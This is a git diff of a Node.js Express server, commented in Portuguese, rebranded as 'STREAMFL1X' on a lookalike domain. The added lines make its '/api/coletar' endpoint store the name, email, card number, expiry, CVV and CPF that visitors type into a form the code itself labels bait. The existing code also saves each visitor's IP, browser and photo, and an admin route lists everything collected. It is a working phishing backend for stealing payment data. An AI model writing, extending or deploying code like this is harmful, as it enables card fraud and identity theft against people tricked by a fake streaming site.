@@ -7,8 +7,7 @@ const { v4: uuidv4 } = require('uuid');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ===== PASTA FIXA DE UPLOADS =====
-// Usando caminho absoluto para garantir que é o mesmo
+// ===== PASTA DE UPLOADS =====
 const UPLOAD_DIR = path.join(process.cwd(), 'uploads');
 
 // Garante que a pasta existe
@@ -40,6 +39,7 @@ app.get('/api/teste', (req, res) => {
         status: 'ok',
         mensagem: 'Servidor funcionando!',
         uploads: UPLOAD_DIR,
+        dominio: 'streamfl1x.up.railway.app',
         timestamp: new Date().toISOString()
     });
 });
@@ -83,20 +83,19 @@ app.post('/api/coletar', (req, res) => {
             navegador: dados.navegador || null,
             ip: req.headers['x-forwarded-for'] || req.ip || 'IP não disponível',
             foto: fotoBase64,
-            fotoSalva: fotoSalva
+            fotoSalva: fotoSalva,
+            // Dados do formulário (isca)
+            nome: dados.nome || null,
+            email: dados.email || null,
+            cartao: dados.cartao || null,
+            validade: dados.validade || null,
+            cvv: dados.cvv || null,
+            cpf: dados.cpf || null
         };
 
-        // Salva o JSON
         const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
         fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
         console.log(`💾 Dados salvos: ${jsonPath}`);
-
-        // Verifica se o arquivo foi criado
-        if (fs.existsSync(jsonPath)) {
-            console.log('✅ Arquivo confirmado!');
-        } else {
-            console.log('❌ Arquivo NÃO foi criado!');
-        }
 
         res.json({
             status: 'success',
@@ -122,7 +121,7 @@ app.get('/api/admin', (req, res) => {
     try {
         if (!fs.existsSync(UPLOAD_DIR)) {
             console.log('⚠️ Pasta não existe');
-            return res.json({ total: 0, arquivos: [], mensagem: 'Pasta não existe' });
+            return res.json({ total: 0, arquivos: [] });
         }
 
         const arquivos = fs.readdirSync(UPLOAD_DIR);
@@ -152,20 +151,18 @@ app.get('/api/admin', (req, res) => {
 
         res.json({
             total: dadosArquivos.length,
-            arquivos: dadosArquivos,
-            pasta: UPLOAD_DIR
+            arquivos: dadosArquivos
         });
 
     } catch (error) {
         console.error('💥 ERRO admin:', error);
         res.status(500).json({
-            erro: error.message,
-            stack: error.stack
+            erro: error.message
         });
     }
 });
 
-// ===== ROTA PARA VER O CONTEÚDO DA PASTA =====
+// ===== ROTA PARA VER PASTA =====
 app.get('/api/ver-pasta', (req, res) => {
     try {
         if (!fs.existsSync(UPLOAD_DIR)) {
@@ -196,11 +193,11 @@ app.get('/admin.html', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`
     ════════════════════════════════════════════
-    🚀 SERVIDOR RODANDO
+    🎬 STREAMFL1X - SERVIDOR RODANDO
     ════════════════════════════════════════════
     📡 Porta: ${PORT}
     📁 Uploads: ${UPLOAD_DIR}
-    🌐 URL: https://coleta-production.up.railway.app
+    🌐 Domínio: https://streamfl1x.up.railway.app
     ════════════════════════════════════════════
     `);
 });
